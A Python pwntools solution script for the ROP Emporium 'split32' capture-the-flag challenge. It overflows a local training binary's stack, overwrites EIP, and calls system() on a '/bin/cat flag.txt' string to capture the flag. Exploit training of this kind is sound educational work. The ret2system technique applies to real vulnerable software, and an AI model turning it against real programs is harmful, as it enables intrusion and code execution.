#!/usr/bin/env python3

# ROP Emporium - split32 solution using pwntools library
# Link: https://ropemporium.com/challenge/split.html
# Created by dilldylanpickle on 4-12-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10
#   - Pwntools (https://github.com/Gallopsled/pwntools)

import os           # Provides a way of using operating system dependent functionalities
import re           # Allows pattern matching and text processing through regex
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)

    # Set log level to debug if debugging is needed
    context.log_level = 'debug'

    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Get the address of the system() function
        system_addr = elf.symbols["system"]
        log.debug(f"The address of system() is {hex(system_addr)}")

        # Find the address of the "/bin/cat flag.txt" string
        string_addr = next(elf.search(b'/bin/cat flag.txt'))
        log.debug(f"The address of the /bin/cat flag.txt string is {hex(string_addr)}")

        # Get the offset by calling the find_offset function
        offset = find_offset(binary_path)
        log.debug(f"The offset calculated overwrite EIP is {offset} bytes")

        # Construct the payload
        payload = b'\x69' * offset
        payload += p32(system_addr)
        payload += p32(0x0)
        payload += p32(string_addr)
        
        # Print the payload in hexadecimal representation for debugging purposes
        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))

        # Send the payload and print the output
        io.sendline(payload)
        output = io.clean().decode()
        log.info(output)

        # Use regular expression to search for the flag pattern
        flag_pattern = r'ROPE{[^}]+}'
        match = re.search(flag_pattern, output)

        # Verify if the ROP exploit was successful in capturing the flag 
        if match:
            flag = match.group(0)
            log.success(f"(SUCESS) The flag {flag} has been successfully captured!")
        else:
            log.failure("(FAILURE) You failed to capture the flag. Try a new payload!")

def find_offset(binary_path):

    # Save the original log level which would be either 'info' or 'debug'
    log_level = context.log_level

    # Disable logging for offset calculations
    context.log_level = 'error'

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)
    
    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Send a cyclic pattern as input to the binary
        pattern = cyclic(69)
        io.sendline(pattern)
        io.wait()           

        # Get the corefile to extract the value of the instruction pointer (eip)
        core = io.corefile
        eip = core.eip

        # Find the offset by searching for the cyclic pattern in the eip value
        offset = cyclic_find(p32(eip), n=4)

        # Revert the log level to the original value
        context.log_level = log_level

    # Return the calculated offset to overwrite the instruction pointer
    return offset

if __name__ == '__main__':
    binary_path = './split32'
    warnings.filterwarnings("ignore", category=BytesWarning)
    exploit(binary_path)

    # Create a directory called 'core' if it does not already exist
    if not os.path.exists('Core_Dumps'):
        os.makedirs('Core_Dumps')

    # Move all files with the pattern 'core.*' to the 'core' directory
    for filename in os.listdir('.'):
        if filename.startswith('core.'):
            os.rename(filename, os.path.join('Core_Dumps', filename))
